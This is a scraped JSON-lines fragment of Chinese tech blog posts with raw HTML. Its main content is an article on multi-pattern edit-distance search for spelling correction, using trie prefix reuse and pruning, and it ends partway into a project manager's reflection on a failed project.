data-item-id=\"114382\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"}
{"title": "基于海量词库的单词拼写检查、推荐到底是咋做的？", "url": "http://blog.jobbole.com/114358/", "create_date": "2018/09/07", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/03b5b99cd8b93d7c062277c5de23570b.jpg"], "url_object_id": "1c0b69a271aea46720c38385a705991c", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,词库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/haolujun/p/9585509.html\">haolujun</a>   </div><div id=\"cnblogs_post_body\">\n<h1 id=\"前言\">前言</h1>\n<p>在我们日常应用中，应该遇到不少类似的状况：</p>\n<ul>\n<li>写文档时，单词拼写错误后，工具自动推荐一个相似且正确的拼写形式；</li>\n<li>使用搜狗输入法时，敲错某个字的拼音照样能够打出我们想要的汉字；</li>\n<li>利用搜索引擎进行搜索时，下拉框中自动列出与输入相近的词语。</li>\n<li>等等，不一一列举。</li>\n</ul>\n<p>这种功能是如何实现的呢？里面用到了哪些算法呢？本文就来介绍一个能够完成这个任务的算法。</p>\n<h2 id=\"问题描述\">问题描述</h2>\n<p>其实，这几个问题都能够转换成同一个问题：即对于给定的输入字符串T，在预先准备好的模式串集合Q中找到与输入串相似的模式串子集。</p>\n<p>那么如何得到准备好的这些模式串集合呢？我们可以通过数据挖掘等一些机制来得到。</p>\n<p>那么接下来的问题就是如何快速的从这个集合中找到与输入串相似的字符串？通常我们用最小编辑距离来表示两个字符串的相似程度。</p>\n<p>例如，对于输入串T，我们限制错误数小于等于2，即在预先准备好的模式集合中找所有与输入串编辑距离小于等于2的字符串。</p>\n<p>有什么算法能够快速完成这个任务呢？</p>\n<h2 id=\"暴力算法\">暴力算法</h2>\n<p>遍历集合Q中的每个模式串P，分别计算其与输入串T的最小编辑距离，如果编辑距离小于指定的错误容忍度x，则输出这个模式串。</p>\n<ul>\n<li>时间复杂度：O(|Q| * n * m)，当|Q|很大时，速度将会很慢。</li>\n</ul>\n<p>那么这个算法可以优化么？可以！</p>\n<p>比如，第一个字很少有人输入错，所以我们可以在模式串集合Q中只对第一个字与输入串第一个字相同的那些字符串进行相似度计算，这样就能够减少相当多的算量，是一个可行方法。</p>\n<p>但是这也有问题，假若少部分人确实第一个字输入错了，那么这个算法找到的所有串也是错的，不能达到纠错的效果。</p>\n<p>所以，针对首字符过滤的优化算法有一定的局限性。</p>\n<h2 id=\"步步优化\">步步优化</h2>\n<p>我们仔细思考这个问题，由于模式串Q是一个集合，那么其中必定有大量的模式串有共同的前缀。能否利用这个前缀进行优化呢？</p>\n<h4 id=\"优化1-利用两个词的相同前缀进行优化\">优化1： 利用两个词的相同前缀进行优化</h4>\n<p>比如：字符串 explore和explain，他们有公共的前缀，这就意味着他们与字符串explode的编辑矩阵的前几列值是相同的，不用重复计算，如下图红色部分所示。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/6b81c4bb8a7804c54bce2e8238499d4d.png\"></p>\n<p>explore与explain无论与任何字符串计算编辑距离，编辑矩阵的前4列肯定一模一样。所以，如果我们已经计算过explore与某个串的编辑距离后，那么当计算该串与explain的编辑距离时，前4列可以复用，直接从第五列开始计算。</p>\n<p>到此，我们得到一个新的算法计算多模式的编辑距离：把模式串集合建立成一棵字典树，深度优先遍历这棵树，在遍历的过程中，不断更新编辑矩阵的某一个列，如果到达的节点是一个终结符，并且T与P（路径上的字符形成的字符串）的编辑距离小于指定的容忍度，则找到一个符合条件的串。</p>\n<h3 id=\"优化2剪枝\">优化2：剪枝</h3>\n<p>虽然我们利用词前缀优化了算法，能够避免拥有相同前缀模式串的编辑矩阵的重复计算，但是必须要遍历所有节点。有没有什么办法能够在计算到某一深度后，根据一些限制条件能够剪去该子树其它剩余节点的计算呢？在搜索算法中，这种优化叫做剪枝。接下来我们讨论一下该如何设计一个剪枝函数。</p>\n<p>重新审视我们的编辑距离定义，其实可以看成是把字符串P和T分别拆分成两段，然后计算对应的段的编辑距离之和，如下图所示。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/20d56bfac8d442debca343d977f2a9c7.png\"></p>\n<p>字符串P和T分别拆分成两段，红色和绿色。红色部分之间的编辑距离与绿色部分之间的编辑距离之和即为字符串P和T的编辑距离。</p>\n<p>举个例子，更形象：</p>\n<ul>\n<li>例子1<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/9ca01e50bde33fdc2a171f2ce7326356.png\"></li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670490824617250633\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ned(\"explore\", \"express\") = ed(\"explo\", \"exp\") + ed(\"re\", \"ress\")</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670490824617250633-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670490824617250633-1\"><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"explore\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"express\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"explo\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"exp\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"re\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"ress\"</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<ul>\n<li>例子2<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/5f9235b8943733fe2cf38090a84beb09.png\"></li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67049082f558872639\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ned(\"explore\", \"express\") = ed(\"exp\", \"exp\") + ed(\"lore\", \"ress\")</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67049082f558872639-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67049082f558872639-1\"><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"explore\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"express\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"exp\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"exp\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"lore\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"ress\"</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<ul>\n<li>例子3<br>\n但是，并不是每种划分都是正确的，比如下面图所示：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/bf3bef35858e60c200fae355b5b2ed2c.png\"></li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670490834541813632\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ned(\"ex\",\"exp\") + ed(\"plore\", \"ress\") = 1 + 4 = 5</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670490834541813632-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670490834541813632-1\"><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"ex\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"exp\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"plore\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"ress\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p><strong>所以，最小编辑距离问题又相当于一个最优拆分，即对于字符串P中位置为i的字符，找到在T中的一个最优位置j，使得</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670490837098779417\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ned(P.prefix(i), T.prefix(j)) + ed(P.suffix(i+1), T.suffix(j+1))</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670490837098779417-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670490837098779417-1\"><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">P</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">prefix</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">prefix</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">P</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">suffix</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">suffix</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p><strong>最小。</strong></p>\n<p>回到我们这个问题中来，如果我们限制P和T的最小编辑距离小于等于x，</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e3bebd84db26517fba83de949eee80b9.png\"></p>\n<p>我们让 p[i]分别匹配t[i-x],t[i-x+1],……,t[i],t[i+1],……t[i+x]，并找到其中前半段匹配的最小的编辑距离ed1=ed(p[1~i],t[1~j])，如果ed1大于x，我们则能推断出ed(p,t)也终将大于x（ed=ed1+ed2&gt;x）。</p>\n<p>为什么p[i]不匹配t[i-x-1]以及之前的位置呢？那是因为ed(p.prefix(i), t.prefix(i-x-1)) &gt; x，因为必须至少在t.prefix(i-x-1)中插入x+1个字符才能保证字符串长度相等；同理p[i]也不能匹配t[i+x+1]及其之后的位置。所以，根据分段原则，最优匹配肯定出现在t[i-x] ~ t[i+x]之间，如果这个区间的最小编辑距离都大于x，那么我们无需对p[i+1]及其之后的字符进行匹配计算。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/fcf1ee5a9fe3f9f583cd37264f33cb90.png\"></p>\n<p>例如：当遍历到蓝色节点l时，路径形成的字符串expl与T=exist满足剪枝条件，则后序节点不需要遍历，因为后面不可能有任何一个字符串满足与T的编辑距离小于2。</p>\n<p><strong>至此，我们得到了剪枝优化：深度遍历到达字典树的某个节点，其路径上的字符组成字符串P，计算其与T.prefix(i-x), T.prefix(i-x+1),……T.prefix(i+x)的最小编辑距离，如果其中的最小值大于x，则停止遍历这棵子树上的后面的节点。</strong></p>\n<p>其实，这个最终版本的优化算法出自论文：<strong>《Error-tolerant finite-state recognition with applications to morphological analysis and spelling correction》.K Oflazer:1996 </strong></p>\n<h3 id=\"代码实现与效果对比\">代码实现与效果对比</h3>\n<p>代码实现需需要很强的技巧性，因为无论是剪枝函数还是进行最终确认函数都可以复用同一个编辑矩阵，贴一个很丑陋的代码：<a href=\"https://github.com/haolujun/Algorithm/tree/master/muti-edit-distance\">https://github.com/haolujun/Algorithm/tree/master/muti-edit-distance</a></p>\n<p>这个算法在错误容忍度非常小的情况下效率非常高，我随机生成了10万个长度5~10的模式串，再随机生成100个输入串T（长度5 ~ 10），字符集大小为10，x最小编辑距离限制，计算多模式编辑距离，处理总时间如下，单位ms：</p>\n<table>\n<thead>\n<tr>\n<th>算法</th>\n<th>x = 1</th>\n<th>x = 2</th>\n<th>x = 3</th>\n<th>x = 4</th>\n<th>x = 5</th>\n<th>x = 6</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>暴力算法</td>\n<td>21990</td>\n<td>21990</td>\n<td>21990</td>\n<td>21990</td>\n<td>21990</td>\n<td>21990</td>\n</tr>\n<tr>\n<td>优化算法</td>\n<td>97</td>\n<td>922</td>\n<td>4248</td>\n<td>11361</td>\n<td>20097</td>\n<td>28000</td>\n</tr>\n</tbody>\n</table>\n<p>当容忍度很小时，优化算法完胜暴力算法，并且实际应用中x一般取值都非常小，正好适合优化算法。</p>\n<p>当x值增大，优化算法效率逐渐下降，并且最后慢于暴力算法，这是因为优化算法实现复杂导致（递归+更复杂的判断）。</p>\n<p>所以，最终应用时，我们根据x值选择不同的算法。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114358\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114358votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114358\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/3ef52bc5d5cc6d23e102e0ce679d152bdd3b5cc7.jpg"}
{"title": "一名 IT 经理是怎么把一个项目带崩的", "url": "http://blog.jobbole.com/107390/", "create_date": "2018/09/04", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/862d3441fe78a8d48f7dc96d0acc95d2.jpg"], "url_object_id": "a4f9261d9f5a4715d36aa799dff90f52", "praise_nums": 4, "fav_nums": 3, "comment_nums": 7, "tags": "职场,PM", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/lxtalx\">zer0Black</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>我是一名项目经理，在过去的四个月里，我把一个项目带崩了（上线后频出问题，用户无法使用）。在最近的几天，我每天都在反思自己，我都在问自己以下几个问题：</p>\n<p>1.我做错了什么？<br>\n2.我在其中占有多重的因素？</p>\n<p>以下内容，我将回答以上问题，并在最后说一下我的补救措施。</p>\n<h2 id=\"项目和团队背景\">项目和团队背景</h2>\n<p>首先给大家说明一下项目背景，以便各位对此项目有更清晰的了解：</p>\n<p>1.该项目是一个二次开发项目，第一个基础版本（打印申报系统）也由我带领开发。<br>\n2.系统是需要和国家系统对接，有三条主流程。<br>\n3.需求频繁变化，由于系统需要对接国家系统，需求方对需求也不甚了解。曾在5月份一个月内需求变更超过8次，都是主流程变更。<br>\n4.项目大小按照最初需求估算，约在100人天左右。<br>\n5.项目两条主流程无法测试，依赖于外部U盾，但开发过程中并没有U盾。<br>\n6.客户现场使用U盾调试和开发时间约为20天左右。<br>\n7.我当时同时负责大大小小4个项目，没有进入开发，仅管控进度。<br>\n8.团队成员共3名，其中两名是当时开发基础版本的项目成员，他们对此项目较为熟悉。<br>\n9.项目推进过程中，需要多次去现场调试测试，由团队中的两名工程师共同前去。</p>\n<h2 id=\"我做错了什么\">我做错了什么</h2>\n<h4 id=\"除了监控进度还要管理质量\">除了监控进度，还要管理质量</h4>\n<p>在项目的开发初期，我制定了一份详细的开发计划，用于指导整个开发过程。开发计划交付与了客户，而答应了的事情就要做到，所以在整个项目过程中，我对进度管控很严。我定期检查功能是否完成，定期和客户汇报情况，保证了开发进度顺利推进。但也由此埋下了祸根，仅仅看需求是否完成，而未关注完成的质量如何。</p>\n<p>项目质量出现了许多细节性问题。比如：</p>\n<p>1.上线后，客户那边发现其中一条主流程都走不下去<br>\n2.其中申报功能，系统提示成功。但实际上并没有真的申报成功，申报后在国家系统无法查询到<br>\n3.打印功能小问题较多，打印获取的数据错误<br>\n4.同步数据的功能无法同步或者同步的数据错误<br>\n5.执行时间过长的功能，数据库会强制断开连接</p>\n<p>等等问题，就不一一列举</p>\n<p><strong><em>反思：</em></strong></p>\n<p>1.进度和开发速度固然重要，但以质量换速度不可取<br>\n2.如果开发时间和质量冲突，优先保质量，毕竟你埋下的坑，总是要坑你自己的<br>\n3.再困难的情况下，也要保证基本测试<br>\n4.时间极其不允许的情况下，也要保证主线功能顺利执行</p>\n<h4 